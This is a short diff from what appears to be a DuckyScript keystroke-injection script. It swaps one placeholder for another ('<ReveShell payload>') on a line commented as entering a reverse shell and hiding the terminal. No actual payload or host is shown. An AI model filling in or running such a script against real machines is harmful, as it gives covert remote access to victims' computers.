@@ -74,6 +74,7 @@ ALT y
 DELAY 1000
 
 REM Enter reverse shell and hides the terrminal
-STRINGLN <POWERSHELL Payload goes here>
+STRINGLN <ReveShell payload>
 DELAY 200
 GUI DOWNARROW
+
